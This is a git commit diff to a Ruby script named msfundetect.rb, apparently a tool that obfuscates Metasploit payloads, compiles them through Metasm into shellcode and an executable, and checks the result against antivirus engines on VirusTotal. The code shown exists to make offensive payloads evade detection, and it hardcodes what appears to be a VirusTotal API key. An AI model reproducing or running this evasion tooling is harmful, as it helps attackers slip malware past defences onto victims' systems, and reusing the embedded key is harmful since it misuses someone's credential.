533e4a1473b0d55edd1a519a06d13a2d069e5e1a
Martinez Juarez Jose Maria Ariel <jmamj90@gmail.com>
2014-12-09 19:56:48 -0300

    ruby metasm virustotal

--- msfundetect.rb
+++ msfundetect.rb
@@ -30,11 +30,12 @@ void s(){#{w(p_c_payload.size) + p_c_payload.unpack("v*").map{|i| w(eval(f))}.jo
 
 m = Metasm::Shellcode.new(Metasm::Ia32.new)
 j = m.parse(m.cpu.new_ccompiler(m.cpu.new_cparser.parse(c), m).compile).assemble.encode_string
-open('j.c', 'wb'){|i| i << "int main(){#{j.unpack('C*').map{|i| '__asm(".byte 0x%02x");' % i}.join}}\n"}
+open('j.c', 'wb'){|x| x << "int main(){#{j.unpack('C*').map{|y| '__asm(".byte 0x%02x");' % y}.join}}\n"}
 `gcc j.c`
 case ARGV[1].downcase
 	when 'r', 'raw' then $stdout.binmode << j
 	when 'c', 'rb' || 'py' || 'pl' then $stdout.binmode << j.unpack('C*').map{|i| '\\x%02x' % i}.join
 	when 'v', 'vt' then require 'virustotal';$stdout.binmode << VirusTotal::VirusTotal.new('a532cceb55d2ba30e17d76f239f97c33c43dc7f9e444c5f94a62ce850bb575eb', 1).query_upload('a.exe').results
-	else open('a.exe', 'rb'){|i| $stdout.binmode << i.read}
+	when 'x', 'exe' then open('a.exe', 'rb'){|i| $stdout.binmode << i.read}
+	else $stdout.binmode << "usage: msfundetect -t <format> \n formats: exe raw c rb py pl vt (vt for virustotal check which takes some minutes)"
 end
